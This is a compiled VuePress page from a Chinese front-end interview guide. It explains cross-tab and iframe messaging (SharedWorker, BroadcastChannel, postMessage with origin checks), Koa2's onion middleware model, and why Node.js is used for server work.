<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>X-UA-Compatible<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>IE=edge<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width, initial-scale=1.0<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>list<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>SharedWorker message - list page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
      <span class="token keyword">const</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SharedWorker</span><span class="token punctuation">(</span><span class="token string">&#39;./worker.js&#39;</span><span class="token punctuation">)</span>
      worker<span class="token punctuation">.</span>port<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;list&#39;</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token comment">&lt;!-- msg-sharedWork-detail.html --&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>X-UA-Compatible<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>IE=edge<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width, initial-scale=1.0<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>detail<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>SharedWorker message - detail page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>修改标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
      <span class="token keyword">const</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SharedWorker</span><span class="token punctuation">(</span><span class="token string">&#39;./worker.js&#39;</span><span class="token punctuation">)</span>

      <span class="token keyword">const</span> btn1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;btn1&#39;</span><span class="token punctuation">)</span>
      btn1<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;click&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;clicked&#39;</span><span class="token punctuation">)</span>
        worker<span class="token punctuation">.</span>port<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">&#39;detail go...&#39;</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="broadcastchannel" tabindex="-1"><a class="header-anchor" href="#broadcastchannel" aria-hidden="true">#</a> BroadcastChannel</h3><p>标签页 1 控制台输入</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">new</span> <span class="token class-name">BroadcastChannel</span><span class="token punctuation">(</span><span class="token string">&#39;juejin&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>标签页 2 控制台输入</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">new</span> <span class="token class-name">BroadcastChannel</span><span class="token punctuation">(</span><span class="token string">&#39;juejin&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">&#39;hello&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>返回标签页 1 控制台发现打印结果</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">{</span>value: <span class="token string">&quot;hello&quot;</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>通信成功！</p><h3 id="答案-9" tabindex="-1"><a class="header-anchor" href="#答案-9" aria-hidden="true">#</a> 答案</h3><ul><li>webSocket 需要服务端参与，但不限制跨域</li><li>localStorage 简单易用</li><li>SharedWorker 本地调试不太方便，考虑浏览器兼容性</li><li>BroadcastChannel</li></ul><h3 id="连环问-网页和-iframe-如何通讯" tabindex="-1"><a class="header-anchor" href="#连环问-网页和-iframe-如何通讯" aria-hidden="true">#</a> 连环问：网页和 iframe 如何通讯</h3><h4 id="代码演示" tabindex="-1"><a class="header-anchor" href="#代码演示" aria-hidden="true">#</a> 代码演示</h4>`,16),en={href:"https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage",target:"_blank",rel:"noopener noreferrer"},pn=e(`<p>通过 <code>window.postMessage</code> 发送消息。注意第二个参数，可以限制域名，如发送敏感信息，要限制域名。</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// 父页面向 iframe 发送消息</span>
window<span class="token punctuation">.</span>iframe1<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">&#39;hello&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;*&#39;</span><span class="token punctuation">)</span>

<span class="token comment">// iframe 向父页面发送消息</span>
window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">&#39;world&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;*&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可监听 <code>message</code> 来接收消息。可使用 <code>event.origin</code> 来判断信息来源是否合法，可选择不接受。</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;origin&#39;</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>origin<span class="token punctuation">)</span> <span class="token comment">// 通过 origin 判断是否来源合法</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;child received&#39;</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="答案-10" tabindex="-1"><a class="header-anchor" href="#答案-10" aria-hidden="true">#</a> 答案</h4><ul><li>使用 postMessage 通讯</li><li>注意跨域的限制和判断</li></ul><h2 id="_15-请描述-koa2-的洋葱圈模型" tabindex="-1"><a class="header-anchor" href="#_15-请描述-koa2-的洋葱圈模型" aria-hidden="true">#</a> 15: 请描述 koa2 的洋葱圈模型</h2><h3 id="题目-10" tabindex="-1"><a class="header-anchor" href="#题目-10" aria-hidden="true">#</a> 题目</h3><p>请描述 Koa2 的洋葱圈模型</p><h3 id="koa2" tabindex="-1"><a class="header-anchor" href="#koa2" aria-hidden="true">#</a> Koa2</h3><ul><li>一个简约、流行的 nodejs 框架</li><li>通过<strong>中间件</strong>组织代码</li><li>多个中间件以”洋葱圈模型“执行</li></ul><h3 id="解释" tabindex="-1"><a class="header-anchor" href="#解释" aria-hidden="true">#</a> 解释</h3><p>代码参考 Koa2 官网</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">const</span> Koa <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;koa&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Koa</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">// logger</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> rt <span class="token operator">=</span> ctx<span class="token punctuation">.</span>response<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&#39;X-Response-Time&#39;</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">\`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">\${</span>ctx<span class="token punctuation">.</span>method<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">\${</span>ctx<span class="token punctuation">.</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> - </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">\${</span>rt<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">\`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// x-response-time</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> start <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> ms <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start
  ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&#39;X-Response-Time&#39;</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">\`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">\${</span>ms<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">ms</span><span class="token template-punctuation string">\`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// response</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token string">&#39;Hello World&#39;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="图示" tabindex="-1"><a class="header-anchor" href="#图示" aria-hidden="true">#</a> 图示</h3><p><img src="`+_+'" alt=""></p><p><img src="'+y+'" alt=""></p><h3 id="划重点-4" tabindex="-1"><a class="header-anchor" href="#划重点-4" aria-hidden="true">#</a> 划重点</h3><ul><li>一定要先把 &quot;JS 异步编程&quot; 理解透彻，否则越看越乱</li></ul><h2 id="_16-扩展-后端有了-java-php-python-为何还需要-nodejs" tabindex="-1"><a class="header-anchor" href="#_16-扩展-后端有了-java-php-python-为何还需要-nodejs" aria-hidden="true">#</a> 16：扩展：后端有了 java php python ，为何还需要 nodejs</h2><h3 id="题目-11" tabindex="-1"><a class="header-anchor" href="#题目-11" aria-hidden="true">#</a> 题目</h3><p>当 Java PHP Python 等服务端语言和技术都完备的情况下，为何还需要 nodejs 做服务端呢？</p><h3 id="对比其他语言" tabindex="-1"><a class="header-anchor" href="#对比其他语言" aria-hidden="true">#</a> 对比其他语言</h3><p>当年 Java 被发明使用时， C C++ 也发展了几十年了，为何 Java 还照样发展壮大起来呢？</p><p>以及近几年、现在，仍有多种新的语言被发明和使用，例如 swift golang Dart 等。</p><p>所以，nodejs 被使用不是个例，而是历史、现在、未来都发生的事情，它仅仅是其中的一件。</p><h3 id="技术的核心价值-——-提升效率" tabindex="-1"><a class="header-anchor" href="#技术的核心价值-——-提升效率" aria-hidden="true">#</a> 技术的核心价值 —— 提升效率</h3><p>如果你去做一个年终总结或者晋升述职，你对你的领导说：<br> “我今年用了一个 xx 技术，非常厉害。最先进的技术，github stars 多少多少，国内外个大公司都在用，基于它来开发非常爽...”</p><p>说完，你的领导心里会有一个大大的问号：然后呢？这个技术给我降低了多少成本？带来了多少收益？—— 技术是生产力，技术的厉害最终都会体现到生产效率。<br> 让领导带着这个疑问，那你的年终奖或者晋升估计悬了。</p><p>现在你换一种说法：<br> “我今年用了一个 xx 技术，非常厉害。这一年我们的项目工期降低了 xx ，项目 bug 率降低了 xx ，核算项目成本降低了 xx ，效率增加了 xx ...”<br> 然后把这个技术的优势展示一下，再展示一些统计数据。</p><p>说完，领导一看就觉得心里踏实了。</p><p>PS：不仅仅是软件技术，这个世界上任何技术、产品、制度流程、组织关系的存在，都是在优化效率。乃至全社会的经济发展，说白了就是生产效率。</p><h3 id="nodejs-如何提升效率" tabindex="-1"><a class="header-anchor" href="#nodejs-如何提升效率" aria-hidden="true">#</a> nodejs 如何提升效率</h3><p>网上说的 nodejs 的好处，大概都是：单线程，基于事件驱动，非阻塞，适合高并发服务。<br> 这些都是技术优势，就跟上文的第一个述职一样，没有体现任何生产效率的价值。</p><p>有同学可能会问：“适合高并发服务” 这不就是生产效率吗？—— 这是一个好问题<br> 但是，我们看问题得综合起来看。例如，你告诉 Java 工程师 nodejs 的好处，他们会用吗？—— 不会的，因为学习和切换技术栈需要大量的成本。</p><p>所以，nodejs 的关键在于它用了 JS 语法，而社会上有大量的熟悉 JS 的前端工程师。</p><ul><li>JS 语言不用学习，只需要了解 nodejs API 即可</li><li>前端工程师不做服务端，没有切换技术栈的历史包袱</li></ul><p>而前端工程师如果想要做服务端、做 webpack 等工具，nodejs 显然是他们最适合的技术方案，效率最高的方案。<br> 如果让他们再去学习 Java 等其他语言，这又是一大成本。</p><h3 id="前端工程师需要自己做服务端吗" tabindex="-1"><a class="header-anchor" href="#前端工程师需要自己做服务端吗" aria-hidden="true">#</a> 前端工程师需要自己做服务端吗？</h3><p>如果是一个公司级别的系统，庞大的项目，前端、客户端、服务端指责划分明确，只不需要前端工程师来开发服务端的。</p><p>但有些职能部门，需要开发一些企业内部的管理工具，或者一些小型的系统。此时再去找服务端的人，会遇到很多沟通障碍，特别是某些大公司，还有很多其他非技术的因素阻碍沟通。所以，预期困难的沟通还不如自己搞一个，反正也不会很复杂（相对于企业级的大系统后端来说）。</p><p>而且，自己开发了服务端，就可以争取到更多的资源和工作机会。领导很希望这样，因为这样可以扩大自己的退伍，有利于领导未来的晋升。</p><p>综合来看，在这些情况下，前端人员用 nodejs 自研服务端，是不是效率最高的方式呢？—— 答案很明显。</p><h3 id="总结" tabindex="-1"><a class="header-anchor" href="#总结" aria-hidden="true">#</a> 总结</h3><p>nodejs 有一定的技术优势，但它真正的优势在于使用 JS 语法，前端工程师学习成本低，能提高研发效率。</p><h2 id="_17-总结" tabindex="-1"><a class="header-anchor" href="#_17-总结" aria-hidden="true">#</a> 17: 总结</h2><h3 id="内容总结" tabindex="-1"><a class="header-anchor" href="#内容总结" aria-hidden="true">#</a> 内容总结</h3><p>本章讲解前端知识广度的面试题，从前端到全栈。 包括移动端、nodejs 服务端、网络，这些都是和前端相关的技术领域。 高级工程师都有一定的技术广度，这样才能全面分析、保证排查问题。</p><h3 id="划重点-5" tabindex="-1"><a class="header-anchor" href="#划重点-5" aria-hidden="true">#</a> 划重点</h3><ul><li>移动端相关支持</li><li>HTTP 网路相关支持</li><li>nodejs 相关支持</li></ul><h3 id="注意事项-1" tabindex="-1"><a class="header-anchor" href="#注意事项-1" aria-hidden="true">#</a> 注意事项</h3><ul><li>广了就不可能深</li><li>不会从 0 基础讲起，基础不熟悉的可以给我提问</li></ul>',52);function on(cn,ln){const s=o("ExternalLinkIcon");return c(),l("div",null,[P,n("p",null,[n("a",T,[a("FastClick"),t(s)]),a(" 专门用于解决这个问题。")]),C,n("ul",null,[W,n("li",null,[a("通过 "),n("a",D,[a("DOM 自定义事件"),t(s)]),a(" 模拟一个 click 事件")]),E]),I,n("p",null,[n("a",O,[a("单系统登录机制"),t(s)])]),n("p",null,[n("a",A,[a("单点登录(SSO)看这一篇就够了！❤️ 这次不慌了"),t(s)])]),F,n("p",null,[n("a",J,[a("最详细的一篇关于 Oauth2 的认证模式"),t(s)])]),n("p",null,[a("上述 SSO 是 oauth 的实际案例，其他常见的还有微信登录、github 登录等。即，当设计到第三方用户登录校验时，都会使用 OAuth2.0 标准。 流程参考 "),n("a",M,[a("RFC 6749"),t(s)])]),U,n("ul",null,[n("li",null,[n("a",L,[a("https://www.npmjs.com/package/xss"),t(s)])]),n("li",null,[n("a",H,[a("https://www.npmjs.com/package/escape-html"),t(s)])])]),N,n("p",null,[a("DDoS 的预防：软件层面不好做，可以选择商用的防火墙，如"),n("a",R,[a("阿里云 WAF"),t(s)]),a("。")]),n("p",null,[a("PS：阮一峰的网站就曾遭遇过 DDoS 攻击 "),n("a",B,[a("https://www.ruanyifeng.com/blog/2018/06/ddos.html"),t(s)])]),z,n("p",null,[a("PS：如果做项目开发，推荐使用 "),n("a",X,[a("socket.io"),t(s)]),a("，API 更方便。")]),G,n("p",null,[n("a",V,[a("WebWorker"),t(s)]),a(" 可以 "),Y,a(" 用来进行 JS 计算，并通过 "),K,a(" 和 "),Q,a(" 和网页通讯。"),$,a(" 但这个 worker 是当前页面专有的，不得多个页面、iframe 共享。")]),Z,n("p",null,[n("a",nn,[a("SharedWorker"),t(s)]),a(" 可以被同域的多个页面共享使用，也可以用于通讯。"),an,a(" 源码参考 msg-sharedWork-list.html 和 msg-sharedWork-detail.html 。注意，worker 中的日志需要 "),sn,a(" 中打开控制台查看。")]),tn,n("p",null,[a("除了上述几个方法，iframe 通讯最常用 "),n("a",en,[a("window.postMessage"),t(s)]),a(" ，支持跨域。")]),pn])}const rn=p(j,[["render",on],["__file","index-06.html.vue"]]);export{rn as default};
